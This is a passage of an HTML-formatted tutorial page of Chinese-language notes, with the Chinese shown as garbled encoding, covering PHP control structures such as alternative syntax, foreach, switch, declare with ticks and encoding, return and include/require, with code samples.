class="line"><span class="comment">/* æ­£ç¡®çš„ä½¿ç”¨æ–¹æ³•ï¼š */</span></span><br><span class="line"><span class="keyword">if</span> ($a &gt; $b):</span><br><span class="line">    <span class="keyword">echo</span> $a.<span class="string">" is greater than "</span>.$b;</span><br><span class="line"><span class="keyword">elseif</span> ($a == $b): <span class="comment">// æ³¨æ„ä½¿ç”¨äº†ä¸€ä¸ªå•è¯çš„ elseif</span></span><br><span class="line">    <span class="keyword">echo</span> $a.<span class="string">" equals "</span>.$b;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">echo</span> $a.<span class="string">" is neither greater than or equal to "</span>.$b;</span><br><span class="line"><span class="keyword">endif</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="æµç¨‹æ§åˆ¶çš„æ›¿ä»£è¯­æ³•"><a href="#æµç¨‹æ§åˆ¶çš„æ›¿ä»£è¯­æ³•" class="headerlink" title="æµç¨‹æ§åˆ¶çš„æ›¿ä»£è¯­æ³•"></a>æµç¨‹æ§åˆ¶çš„æ›¿ä»£è¯­æ³•</h3><p>PHP æä¾›äº†ä¸€äº›æµç¨‹æ§åˆ¶çš„æ›¿ä»£è¯­æ³•ï¼ŒåŒ…æ‹¬ <em>if</em>ï¼Œ<em>while</em>ï¼Œ<em>for</em>ï¼Œ<em>foreach</em> å’Œ <em>switch</em>ã€‚æ›¿ä»£è¯­æ³•çš„åŸºæœ¬å½¢å¼æ˜¯æŠŠå·¦èŠ±æ‹¬å·ï¼ˆ{ï¼‰æ¢æˆå†’å·ï¼ˆ:ï¼‰ï¼ŒæŠŠå³èŠ±æ‹¬å·ï¼ˆ}ï¼‰åˆ†åˆ«æ¢æˆ <code>endif;</code>ï¼Œ<code>endwhile;</code>ï¼Œ<code>endfor;</code>ï¼Œ<code>endforeach;</code> ä»¥åŠ <code>endswitch;</code>ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($a == <span class="number">5</span>): <span class="meta">?&gt;</span></span><br><span class="line">A is equal to <span class="number">5</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼ŒHTML å†…å®¹â€œA is equal to 5â€ç”¨æ›¿ä»£è¯­æ³•åµŒå¥—åœ¨ <em>if</em> è¯­å¥ä¸­ã€‚è¯¥ HTML çš„å†…å®¹ä»…åœ¨ $a ç­‰äº 5 æ—¶æ˜¾ç¤ºã€‚</p>
<p>ä¸æ”¯æŒåœ¨åŒä¸€ä¸ªæ§åˆ¶å—å†…æ··åˆä½¿ç”¨ä¸¤ç§è¯­æ³•ã€‚</p>
<p><em>switch</em> å’Œç¬¬ä¸€ä¸ª <em>case</em> ä¹‹é—´çš„ä»»ä½•è¾“å‡ºï¼ˆå«ç©ºæ ¼ï¼‰å°†å¯¼è‡´è¯­æ³•é”™è¯¯ã€‚ä¾‹å¦‚ï¼Œè¿™æ ·æ˜¯æ— æ•ˆçš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">switch</span> ($foo): <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">case</span> <span class="number">1</span>: <span class="meta">?&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endswitch</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è€Œè¿™æ ·æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸º <em>switch</em> ä¹‹åçš„æ¢è¡Œç¬¦è¢«è®¤ä¸ºæ˜¯ç»“æŸæ ‡è®° <em>?&gt;</em> çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥åœ¨ <em>switch</em> å’Œ <em>case</em> ä¹‹é—´ä¸èƒ½æœ‰ä»»ä½•è¾“å‡ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">switch</span> ($foo): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">case</span> <span class="number">1</span>: <span class="meta">?&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endswitch</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><p><em>foreach</em> è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼ã€‚<em>foreach</em> ä»…èƒ½å¤Ÿåº”ç”¨äºæ•°ç»„å’Œå¯¹è±¡ï¼Œå¦‚æœå°è¯•åº”ç”¨äºå…¶ä»–æ•°æ®ç±»å‹çš„å˜é‡ï¼Œæˆ–è€…æœªåˆå§‹åŒ–çš„å˜é‡å°†å‘å‡ºé”™è¯¯ä¿¡æ¯ã€‚æœ‰ä¸¤ç§è¯­æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $value)</span><br><span class="line">    statement</span><br><span class="line"><span class="keyword">foreach</span> (array_expression <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ç§æ ¼å¼éå†ç»™å®šçš„ <em>array_expression</em> æ•°ç»„ã€‚æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå½“å‰å•å…ƒçš„å€¼è¢«èµ‹ç»™ <em>$value</em> å¹¶ä¸”æ•°ç»„å†…éƒ¨çš„æŒ‡é’ˆå‘å‰ç§»ä¸€æ­¥ï¼ˆå› æ­¤ä¸‹ä¸€æ¬¡å¾ªç¯ä¸­å°†ä¼šå¾—åˆ°ä¸‹ä¸€ä¸ªå•å…ƒï¼‰ã€‚</p>
<p>ç¬¬äºŒç§æ ¼å¼åšåŒæ ·çš„äº‹ï¼Œåªé™¤äº†å½“å‰å•å…ƒçš„é”®åä¹Ÿä¼šåœ¨æ¯æ¬¡å¾ªç¯ä¸­è¢«èµ‹ç»™å˜é‡ <em>$key</em>ã€‚</p>
<p>å½“ <em>foreach</em> å¼€å§‹æ‰§è¡Œæ—¶ï¼Œæ•°ç»„å†…éƒ¨çš„æŒ‡é’ˆä¼šè‡ªåŠ¨æŒ‡å‘ç¬¬ä¸€ä¸ªå•å…ƒã€‚è¿™æ„å‘³ç€ä¸éœ€è¦åœ¨ <em>foreach</em> å¾ªç¯ä¹‹å‰è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.reset.php" target="_blank" rel="noopener">reset()</a>ã€‚</p>
<p>å¯ä»¥å¾ˆå®¹æ˜“åœ°é€šè¿‡åœ¨ <em>$value</em> ä¹‹å‰åŠ ä¸Š &amp; æ¥ä¿®æ”¹æ•°ç»„çš„å…ƒç´ ã€‚æ­¤æ–¹æ³•å°†ä»¥<a href="https://www.php.net/manual/zh/language.references.php" target="_blank" rel="noopener">å¼•ç”¨</a>èµ‹å€¼è€Œä¸æ˜¯æ‹·è´ä¸€ä¸ªå€¼ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">    $value = $value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $arr is now array(2, 4, 6, 8)</span></span><br><span class="line"><span class="keyword">unset</span>($value); <span class="comment">// æœ€åå–æ¶ˆæ‰å¼•ç”¨</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><em>$value</em> çš„å¼•ç”¨ä»…åœ¨è¢«éå†çš„æ•°ç»„å¯ä»¥è¢«å¼•ç”¨æ—¶æ‰å¯ç”¨ï¼ˆä¾‹å¦‚æ˜¯ä¸ªå˜é‡ï¼‰ã€‚ä»¥ä¸‹ä»£ç åˆ™æ— æ³•è¿è¡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>) <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">    $value = $value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>foreach* ä¸æ”¯æŒç”¨â€œ@â€æ¥æŠ‘åˆ¶é”™è¯¯ä¿¡æ¯çš„èƒ½åŠ›ã€‚</p>
<p>ä»¥ä¸‹ä»£ç åŠŸèƒ½å®Œå…¨ç›¸åŒï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"one"</span>, <span class="string">"two"</span>, <span class="string">"three"</span>);</span><br><span class="line">reset($arr);</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">list</span>(, $value) = each($arr)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Value: $value&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Value: $value&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"one"</span>, <span class="string">"two"</span>, <span class="string">"three"</span>);</span><br><span class="line">reset($arr);</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">list</span>($key, $value) = each($arr)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Key: $key; Value: $value&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Key: $key; Value: $value&lt;br /&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ç”¨-list-ç»™åµŒå¥—çš„æ•°ç»„è§£åŒ…-Â¶"><a href="#ç”¨-list-ç»™åµŒå¥—çš„æ•°ç»„è§£åŒ…-Â¶" class="headerlink" title="ç”¨ list() ç»™åµŒå¥—çš„æ•°ç»„è§£åŒ… Â¶"></a>ç”¨ list() ç»™åµŒå¥—çš„æ•°ç»„è§£åŒ…<a href="https://www.php.net/manual/zh/control-structures.foreach.php#control-structures.foreach.list" target="_blank" rel="noopener"> Â¶</a></h4><p><em>(PHP 5 &gt;= 5.5.0, PHP 7)</em></p>
<p>PHP 5.5 å¢æ·»äº†éå†ä¸€ä¸ªæ•°ç»„çš„æ•°ç»„çš„åŠŸèƒ½å¹¶ä¸”æŠŠåµŒå¥—çš„æ•°ç»„è§£åŒ…åˆ°å¾ªç¯å˜é‡ä¸­ï¼Œåªéœ€å°† <a href="https://www.php.net/manual/zh/function.list.php" target="_blank" rel="noopener">list()</a> ä½œä¸ºå€¼æä¾›ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">4</span>],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> <span class="keyword">list</span>($a, $b)) &#123;</span><br><span class="line">    <span class="comment">// $a contains the first element of the nested array,</span></span><br><span class="line">    <span class="comment">// and $b contains the second element.</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"A: $a; B: $b\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">A: 1; B: 2</span></span><br><span class="line"><span class="comment">A: 3; B: 4</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="break-continue"><a href="#break-continue" class="headerlink" title="break/continue"></a>break/continue</h3><p>PHPä¸­ <em>break</em>/continue å¯ä»¥æ¥å—ä¸€ä¸ªå¯é€‰çš„æ•°å­—å‚æ•°æ¥å†³å®šè·³å‡ºå‡ é‡å¾ªç¯ã€‚</p>
<p>*<strong>break* çš„æ›´æ–°è®°å½•</strong></p>
<table>
<thead>
<tr>
<th align="left">ç‰ˆæœ¬</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">5.4.0</td>
<td align="left"><em>break 0;</em> ä¸å†åˆæ³•ã€‚è¿™åœ¨ä¹‹å‰çš„ç‰ˆæœ¬è¢«è§£æä¸º *break 1;*ã€‚</td>
</tr>
<tr>
<td align="left">5.4.0</td>
<td align="left">å–æ¶ˆå˜é‡ä½œä¸ºå‚æ•°ä¼ é€’ï¼ˆä¾‹å¦‚ *$num = 2; break $num;*ï¼‰ã€‚</td>
</tr>
</tbody></table>
<p>continueåŒbreakã€‚</p>
<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>æ³¨æ„å’Œå…¶å®ƒè¯­è¨€ä¸åŒï¼Œ<a href="https://www.php.net/manual/zh/control-structures.continue.php" target="_blank" rel="noopener">continue</a> è¯­å¥ä½œç”¨åˆ° switch ä¸Šçš„ä½œç”¨ç±»ä¼¼äº <em>break</em>ã€‚å¦‚æœåœ¨å¾ªç¯ä¸­æœ‰ä¸€ä¸ª switch å¹¶å¸Œæœ› continue åˆ°å¤–å±‚å¾ªç¯ä¸­çš„ä¸‹ä¸€è½®å¾ªç¯ï¼Œç”¨ <em>continue 2</em>ã€‚</p>
<p><strong>æ³¨æ„ switch/case ä½œçš„æ˜¯<a href="https://www.php.net/manual/zh/types.comparisons.php#types.comparisions-loose" target="_blank" rel="noopener">æ¾æ•£æ¯”è¾ƒ</a>ã€‚</strong></p>
<p><em>switch</em> è¯­å¥ä¸€è¡Œæ¥ä¸€è¡Œåœ°æ‰§è¡Œï¼ˆå®é™…ä¸Šæ˜¯è¯­å¥æ¥è¯­å¥ï¼‰ã€‚å¼€å§‹æ—¶æ²¡æœ‰ä»£ç è¢«æ‰§è¡Œã€‚ä»…å½“ä¸€ä¸ª <em>case</em> è¯­å¥ä¸­çš„å€¼å’Œ <em>switch</em> è¡¨è¾¾å¼çš„å€¼åŒ¹é…æ—¶ PHP æ‰å¼€å§‹æ‰§è¡Œè¯­å¥ï¼Œ<strong>ç›´åˆ° <em>switch</em> çš„ç¨‹åºæ®µç»“æŸæˆ–è€…é‡åˆ°ç¬¬ä¸€ä¸ª <em>break</em> è¯­å¥ä¸ºæ­¢ã€‚å¦‚æœä¸åœ¨ case çš„è¯­å¥æ®µæœ€åå†™ä¸Š <em>break</em> çš„è¯ï¼ŒPHP å°†ç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ª case ä¸­çš„è¯­å¥æ®µã€‚</strong></p>
<p>åœ¨ä¸€ä¸ª case ä¸­çš„è¯­å¥ä¹Ÿå¯ä»¥ä¸ºç©ºï¼Œè¿™æ ·åªä¸è¿‡å°†æ§åˆ¶è½¬ç§»åˆ°äº†ä¸‹ä¸€ä¸ª case ä¸­çš„è¯­å¥ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i is less than 3 but not negative"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i is 3"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ª case çš„ç‰¹ä¾‹æ˜¯ <em>default</em>ã€‚å®ƒåŒ¹é…äº†ä»»ä½•å’Œå…¶å®ƒ case éƒ½ä¸åŒ¹é…çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span> ($i) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i equals 0"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i equals 1"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i equals 2"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"i is not equal to 0, 1 or 2"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…è®¸ä½¿ç”¨åˆ†å·ä»£æ›¿ case è¯­å¥åçš„å†’å·ã€‚</p>
<h3 id="declare"><a href="#declare" class="headerlink" title="declare"></a>declare</h3><p><em>declare</em> ç»“æ„ç”¨æ¥è®¾å®šä¸€æ®µä»£ç çš„æ‰§è¡ŒæŒ‡ä»¤ã€‚<em>declare</em> çš„è¯­æ³•å’Œå…¶å®ƒæµç¨‹æ§åˆ¶ç»“æ„ç›¸ä¼¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">declare</span> (directive)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure>

<p><em>directive</em> éƒ¨åˆ†å…è®¸è®¾å®š <em>declare</em> ä»£ç æ®µçš„è¡Œä¸ºã€‚ç›®å‰åªè®¤è¯†ä¸¤ä¸ªæŒ‡ä»¤ï¼š<em>ticks</em>ï¼ˆæ›´å¤šä¿¡æ¯è§ä¸‹é¢ <a href="https://www.php.net/manual/zh/control-structures.declare.php#control-structures.declare.ticks" target="_blank" rel="noopener">ticks</a> æŒ‡ä»¤ï¼‰ä»¥åŠ <em>encoding</em>ï¼ˆæ›´å¤šä¿¡æ¯è§ä¸‹é¢ <a href="https://www.php.net/manual/zh/control-structures.declare.php#control-structures.declare.encoding" target="_blank" rel="noopener">encoding</a> æŒ‡ä»¤ï¼‰ã€‚</p>
<blockquote>
<p><strong>Note</strong>: encoding æ˜¯ PHP 5.3.0 æ–°å¢æŒ‡ä»¤ã€‚</p>
</blockquote>
<p><em>declare</em> ç»“æ„ä¹Ÿå¯ç”¨äºå…¨å±€èŒƒå›´ï¼Œå½±å“åˆ°å…¶åçš„æ‰€æœ‰ä»£ç ï¼ˆä½†å¦‚æœæœ‰ <em>declare</em> ç»“æ„çš„æ–‡ä»¶è¢«å…¶å®ƒæ–‡ä»¶åŒ…å«ï¼Œåˆ™å¯¹åŒ…å«å®ƒçš„çˆ¶æ–‡ä»¶ä¸èµ·ä½œç”¨ï¼‰ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// these are the same:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// you can use this:</span></span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// entire script here</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// or you can use this:</span></span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line"><span class="comment">// entire script here</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Tick"><a href="#Tick" class="headerlink" title="Tick"></a>Tick</h4><p>Tickï¼ˆæ—¶é’Ÿå‘¨æœŸï¼‰æ˜¯ä¸€ä¸ªåœ¨ <em>declare</em> ä»£ç æ®µä¸­è§£é‡Šå™¨æ¯æ‰§è¡Œ N æ¡å¯è®¡æ—¶çš„ä½çº§è¯­å¥å°±ä¼šå‘ç”Ÿçš„äº‹ä»¶ã€‚N çš„å€¼æ˜¯åœ¨ <em>declare</em> ä¸­çš„ <em>directive</em> éƒ¨åˆ†ç”¨ <code>ticks=N</code> æ¥æŒ‡å®šçš„ã€‚</p>
<p>ä¸æ˜¯æ‰€æœ‰è¯­å¥éƒ½å¯è®¡æ—¶ã€‚é€šå¸¸æ¡ä»¶è¡¨è¾¾å¼å’Œå‚æ•°è¡¨è¾¾å¼éƒ½ä¸å¯è®¡æ—¶ã€‚</p>
<p>åœ¨æ¯ä¸ª tick ä¸­å‡ºç°çš„äº‹ä»¶æ˜¯ç”± <a href="https://www.php.net/manual/zh/function.register-tick-function.php" target="_blank" rel="noopener">register_tick_function()</a> æ¥æŒ‡å®šçš„ã€‚æ›´å¤šç»†èŠ‚è§ä¸‹é¢çš„ä¾‹å­ã€‚æ³¨æ„æ¯ä¸ª tick ä¸­å¯ä»¥å‡ºç°å¤šä¸ªäº‹ä»¶ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// A function called on each tick event</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tick_handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"tick_handler() called\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">register_tick_function(<span class="string">'tick_handler'</span>);</span><br><span class="line"></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    $a += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">print</span>($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">tick_handler() called</span></span><br><span class="line"><span class="comment">tick_handler() called</span></span><br><span class="line"><span class="comment">tick_handler() called</span></span><br><span class="line"><span class="comment">3tick_handler() called</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å’Œä¸Šé¢çš„æ•ˆæœç›¸åŒ</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tick_handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"tick_handler() called\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line">tick_handler();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    $a += <span class="number">2</span>;</span><br><span class="line">    tick_handler();</span><br><span class="line">    <span class="keyword">print</span>($a);</span><br><span class="line">    tick_handler();</span><br><span class="line">&#125;</span><br><span class="line">tick_handler();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="Encoding"><a href="#Encoding" class="headerlink" title="Encoding"></a>Encoding</h4><p>å¯ä»¥ç”¨ encoding æŒ‡ä»¤æ¥å¯¹æ¯æ®µè„šæœ¬æŒ‡å®šå…¶ç¼–ç æ–¹å¼ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(encoding=<span class="string">'ISO-8859-1'</span>);</span><br><span class="line"><span class="comment">// code here</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨ PHP 5.3 ä¸­é™¤éåœ¨ç¼–è¯‘æ—¶æŒ‡å®šäº† <em>â€“enable-zend-multibyte</em>ï¼Œå¦åˆ™ declare ä¸­çš„ encoding å€¼ä¼šè¢«å¿½ç•¥ã€‚æ³¨æ„é™¤éç”¨ <a href="https://www.php.net/manual/zh/function.phpinfo.php" target="_blank" rel="noopener">phpinfo()</a>ï¼Œå¦åˆ™ PHP ä¸ä¼šæ˜¾ç¤ºå‡ºæ˜¯å¦åœ¨ç¼–è¯‘æ—¶æŒ‡å®šäº† <em>â€“enable-zend-multibyte</em>ã€‚å‚è§ <a href="https://www.php.net/manual/zh/ini.core.php#ini.zend.script-encoding" target="_blank" rel="noopener">zend.script_encoding</a>ã€‚</p>
<h3 id="return"><a href="#return" class="headerlink" title="return"></a>return</h3><p>å¦‚æœåœ¨ä¸€ä¸ªå‡½æ•°ä¸­è°ƒç”¨ <strong>return</strong> è¯­å¥ï¼Œå°†ç«‹å³ç»“æŸæ­¤å‡½æ•°çš„æ‰§è¡Œå¹¶å°†å®ƒçš„å‚æ•°ä½œä¸ºå‡½æ•°çš„å€¼è¿”å›ã€‚<strong>return</strong> ä¹Ÿä¼šç»ˆæ­¢ <a href="https://www.php.net/manual/zh/function.eval.php" target="_blank" rel="noopener">eval()</a> è¯­å¥æˆ–è€…è„šæœ¬æ–‡ä»¶çš„æ‰§è¡Œã€‚</p>
<p>å¦‚æœåœ¨å…¨å±€èŒƒå›´ä¸­è°ƒç”¨ï¼Œåˆ™å½“å‰è„šæœ¬æ–‡ä»¶ä¸­æ­¢è¿è¡Œã€‚å¦‚æœå½“å‰è„šæœ¬æ–‡ä»¶æ˜¯è¢« <a href="https://www.php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a> çš„æˆ–è€… <a href="https://www.php.net/manual/zh/function.require.php" target="_blank" rel="noopener">require</a> çš„ï¼Œåˆ™æ§åˆ¶äº¤å›è°ƒç”¨æ–‡ä»¶ã€‚æ­¤å¤–ï¼Œå¦‚æœå½“å‰è„šæœ¬æ˜¯è¢« <a href="https://www.php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a> çš„ï¼Œåˆ™ <strong>return</strong> çš„å€¼ä¼šè¢«å½“ä½œ <a href="https://www.php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a> è°ƒç”¨çš„è¿”å›å€¼ã€‚å¦‚æœåœ¨ä¸»è„šæœ¬æ–‡ä»¶ä¸­è°ƒç”¨ <strong>return</strong>ï¼Œåˆ™è„šæœ¬ä¸­æ­¢è¿è¡Œã€‚å¦‚æœå½“å‰è„šæœ¬æ–‡ä»¶æ˜¯åœ¨ php.ini ä¸­çš„é…ç½®é€‰é¡¹ <a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-prepend-file" target="_blank" rel="noopener">auto_prepend_file</a> æˆ–è€… <a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-append-file" target="_blank" rel="noopener">auto_append_file</a> æ‰€æŒ‡å®šçš„ï¼Œåˆ™æ­¤è„šæœ¬æ–‡ä»¶ä¸­æ­¢è¿è¡Œã€‚</p>
<blockquote>
<p><strong>Note</strong>: å½“ç”¨å¼•ç”¨è¿”å›å€¼æ—¶<em>æ°¸è¿œä¸è¦</em>ä½¿ç”¨æ‹¬å·ï¼Œè¿™æ ·è¡Œä¸é€šã€‚åªèƒ½é€šè¿‡å¼•ç”¨è¿”å›å˜é‡ï¼Œè€Œä¸æ˜¯è¯­å¥çš„ç»“æœã€‚å¦‚æœä½¿ç”¨ <em>return ($a);</em> æ—¶å…¶å®<strong>ä¸æ˜¯è¿”å›ä¸€ä¸ªå˜é‡ï¼Œè€Œæ˜¯è¡¨è¾¾å¼ <em>($a)</em> çš„å€¼</strong>ï¼ˆå½“ç„¶ï¼Œæ­¤æ—¶è¯¥å€¼ä¹Ÿæ­£æ˜¯ $a çš„å€¼ï¼‰ã€‚</p>
</blockquote>
<h3 id="include-require"><a href="#include-require" class="headerlink" title="include/require"></a>include/require</h3><p>åŒ…å«æ–‡ä»¶ç”¨ã€‚åŒºåˆ«æ˜¯includeé‡é”™äº§è­¦å‘Šï¼Œrequireé‡é”™ç»ˆæ­¢ã€‚</p>
